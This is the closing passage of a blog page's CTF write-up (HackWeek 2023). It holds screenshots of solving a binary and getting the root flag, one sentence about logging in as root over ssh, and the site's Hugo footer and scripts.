+<p><figure><a class="lightgallery" href="/hackweek23-ctf/22.png" title="Solving the binary" data-thumbnail="/hackweek23-ctf/22.png" data-sub-html="<h2>Solving the binary</h2><p>Solving the binary</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/22.png"
+            data-srcset="/hackweek23-ctf/22.png, /hackweek23-ctf/22.png 1.5x, /hackweek23-ctf/22.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/22.png" width="1905" height="166" />
+    </a><figcaption class="image-caption">Solving the binary</figcaption>
+    </figure></p>
+<h2 id="root-flag">Root flag</h2>
+<p>With this password, we can login as <code>root</code> through <code>ssh</code> on the machine and get the root flag.</p>
+<p><figure><a class="lightgallery" href="/hackweek23-ctf/23.png" title="root flag" data-thumbnail="/hackweek23-ctf/23.png" data-sub-html="<h2>root flag</h2><p>root flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackweek23-ctf/23.png"
+            data-srcset="/hackweek23-ctf/23.png, /hackweek23-ctf/23.png 1.5x, /hackweek23-ctf/23.png 2x"
+            data-sizes="auto"
+            alt="/hackweek23-ctf/23.png" width="1910" height="803" />
+    </a><figcaption class="image-caption">root flag</figcaption>
+    </figure></p>
+<p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-29</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackweek23-ctf/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackweek23-ctf/" data-title="HackWeek 2023 - CTF" data-via="ssaadakhtarr" data-hashtags="ctf,writeup"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackweek23-ctf/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackweek23-ctf/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">ctf</a>,&nbsp;<a href="/tags/writeup/">writeup</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-ambassador/" class="prev" rel="prev" title="HackTheBox - Ambassador"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Ambassador</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
